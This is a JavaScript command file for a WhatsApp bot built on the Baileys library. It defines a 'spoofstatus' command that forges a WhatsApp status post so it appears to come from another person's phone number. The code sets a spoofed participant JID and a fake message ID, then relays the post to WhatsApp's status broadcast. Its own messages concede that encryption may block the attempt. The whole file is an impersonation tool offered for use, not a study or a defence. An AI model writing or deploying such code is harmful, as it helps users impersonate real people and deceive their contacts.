const { downloadMediaMessage, generateWAMessageContent, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const settings = require('../../settings');
const logger = require('../../lib/logger');

module.exports = {
    name: 'spoofstatus',
    aliases: ['fakestatus', 'sstatus'],
    category: 'owner',
    description: 'Spoof a WhatsApp status as another user',
    usage: '.spoofstatus <number> <caption> (Reply to an image)',
    ownerOnly: true,
    react: '🎭',

    async execute(conn, mek, args, chatId, isOwner) {
        if (!isOwner) return;

        const targetNum = (args[0] || '').replace(/[^0-9]/g, '');
        const caption = args.slice(1).join(' ') || '';

        if (!targetNum || targetNum.length < 10) {
            return conn.sendMessage(chatId, { text: `❌ Provide a valid target number. Example: ${settings.prefix}spoofstatus 254712345678 Hello World` }, { quoted: mek });
        }

        const quoted = mek.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted || !quoted.imageMessage) {
            return conn.sendMessage(chatId, { text: `❌ You must reply to an *Image* to spoof a status.` }, { quoted: mek });
        }

        await conn.sendMessage(chatId, { react: { text: '⏳', key: mek.key } });
        await conn.sendMessage(chatId, { text: `🎭 *Forging Status...*` }, { quoted: mek });

        try {
            // 1. Download the image the user replied to
            const buffer = await downloadMediaMessage(
                { message: quoted, key: mek.key },
                'buffer',
                {},
                { logger: console, reuploadRequest: conn.updateMediaMessage }
            );

            // 2. Upload image to WhatsApp servers
            const mediaUpload = await conn.waUploadToServer(buffer, { fileEncSha256: null });
            
            // 3. Create the Status Message content
            const statusMsg = generateWAMessageContent(
                { image: buffer, caption: caption },
                { upload: conn.waUploadToServer }
            );

            // 4. Create the full message with the SPOOFED participant
            const spoofedJid = targetNum + '@s.whatsapp.net';
            
            const message = generateWAMessageFromContent(
                'status@broadcast',
                {
                    [statusMsg.imageMessage ? 'imageMessage' : 'extendedTextMessage']: statusMsg.imageMessage || statusMsg.extendedTextMessage
                },
                {
                    userJid: spoofedJid, // 🔥 THIS IS THE SPOOF
                    messageId: '3EB0' + Math.random().toString(36).substring(2, 18).toUpperCase(), // Fake ID
                }
            );

            // 5. Relay the message to WhatsApp servers
            await conn.relayMessage('status@broadcast', message.message, {
                messageId: message.key.id,
                statusJidList: [spoofedJid, conn.user.id.split(':')[0] + '@s.whatsapp.net']
            });

            await conn.sendMessage(chatId, { 
                text: `✅ *Spoof Attempted!*\n\nTarget: +${targetNum}\nCaption: ${caption}\n\n_If WhatsApp's servers accepted the key, the status is now live on their profile. If they rejected it, it will show a loading error (E2E Encryption blocked it)._` 
            }, { quoted: mek });
            
            await conn.sendMessage(chatId, { react: { text: '✅', key: mek.key } });

        } catch (error) {
            logger.error(`[SPOOFSTATUS] Error: ${error.message}`);
            await conn.sendMessage(chatId, { react: { text: '❌', key: mek.key } });
            await conn.sendMessage(chatId, { 
                text: `❌ Failed to spoof status.\nReason: ${error.message}\n\n*(Note: WhatsApp's E2E encryption blocks most spoofs. If it fails, the API is rejecting the fake JID).*\n\n${settings.footer}` 
            }, { quoted: mek });
        }
    }
};